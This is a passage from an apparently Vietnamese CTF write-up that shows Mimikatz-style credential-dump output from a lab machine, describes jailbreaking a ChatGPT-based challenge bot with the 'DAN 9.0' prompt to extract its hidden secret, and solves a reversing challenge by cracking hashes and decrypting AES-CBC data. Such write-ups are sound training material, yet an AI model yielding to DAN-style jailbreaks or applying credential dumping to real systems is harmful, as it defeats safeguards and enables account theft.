         * Username : HCMUS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : HCMUS$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:17 SA
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : HCMUS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : hcmus$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 46163 (00000000:0000b453)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:16 SA
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : HCMUS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 46164 (00000000:0000b454)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:16 SA
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : HCMUS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 45190 (00000000:0000b086)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:16 SA
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : HCMUS$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 07/05/2023 3:19:16 SA
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : HCMUS$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : hcmus$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :   KO
        credman :
```

Vậy flag là: ``HCMUS-CTF{DuMp_cL34r_t3x1_p4sSw0rD_8y_WD1g3sT_4n|)_m1MiK4zt}``

## AI
### Social Engineering
Bài này là lỗi jail break của ChatGPT. Để lấy được flag thì mình cần biến con bot này thành một con bot có thể làm bất cứ yêu cầu gì mà mình đưa ra. Payload mình lấy ở đây: https://www.jailbreakchat.com/
Mình sử dụng payload DAN 9.0 để gửi cho jason

![upload_55124043a24858eafb8a19fff22d73b6.png (1110×621) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_55124043a24858eafb8a19fff22d73b6.png)

Rồi mình bắt nó đưa cho mình code của jason
![upload_25e93d4ebb60efa580d4cdb6abc7e401.png (1520×483) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_25e93d4ebb60efa580d4cdb6abc7e401.png)
`Flag: HCMUS-CTF{L4rge_L&nguag3_M[]del_Pr0mpT_Inj3cTION}`



## REV+CRY
### Is This Crypto?
Mở file main bằng IDA và đọc source code cùng con ghệ ChatGPT thì mình biết được các thông tin sau:
Đầu tiên chương trình cho mình nhập 2 chuỗi v12 và v13

![upload_c8b8b83b19a2c343861b8d80ee67993d.png (1047×222) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_c8b8b83b19a2c343861b8d80ee67993d.png)

Mình cần phải nhập 2 chuỗi v12 và v13 sao cho `check(v12, v13) == 1`

![upload_f8825a20b6a27c042443da287f52eb9b.png (440×101) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_f8825a20b6a27c042443da287f52eb9b.png)

Trong hàm check thì chương trình thực hiện mã hoá SHA224 với 2 chuỗi của mình và sau đó kiểm tra các đoạn có bằng mảng v8, v9 hay không. Nói cách khác thì v8, v9 chính là SHA224 của chuỗi mình cần nhập để hàm check này trả về 1

![upload_69862623503ef0aef4ed2b5990108411.png (826×601) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_69862623503ef0aef4ed2b5990108411.png)

Chuyển v8, v9 về hex và nối lại là mình được đoạn SHA224 của v12, v13 mà mình cần nhập vào
Dùng tool để decrypt và mình được 2 chuỗi cần tìm

```
ACB7842B5DFEBCAF33801F1C4F3FB333A8F98777CE40F926EC339422:recis
D63687D258B1472F475B89F9E3CDCD5DEB67EA7B8FF26308D0E9E10E:cannibalization
```
Sau đó chương trình sử dụng hàm enc để mã hoá flag và ghi kết quả vào file `./flag.txt.enc`, trong đó v9 là SHA256 của v12 và v10 là MD5 của v13
![upload_a106d1b054ff7160c357d209a955a81f.png (1117×422) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_a106d1b054ff7160c357d209a955a81f.png)

Trong hàm enc thì mình biết được đây là mã hoá AES MODE CBC với key là v9 và IV là v10 

![upload_a8393cf498d0a7eec3ea5b12ff4119f8.png (727×539) (hackmd-prod-images.s3-ap-northeast-1.amazonaws.com)](./assets/upload_a8393cf498d0a7eec3ea5b12ff4119f8.png)

Cả key và IV mình đã tìm ra được rồi nên giờ mình chỉ cần decrypt nữa là xong :)

solve.py
```python
from Crypto.Cipher import AES 
import hashlib
key=hashlib.sha256(b'recis').digest()
iv=hashlib.md5(b'cannibalization').digest()
print(key)
print(iv)
cipher=AES.new(key,AES.MODE_CBC,iv)
ciphertext=open(r"flag.txt.enc",'rb').read()
print(cipher.decrypt(ciphertext))
```
`Flag: HCMUS-CTF{r_u_ready_for_fREddy?}`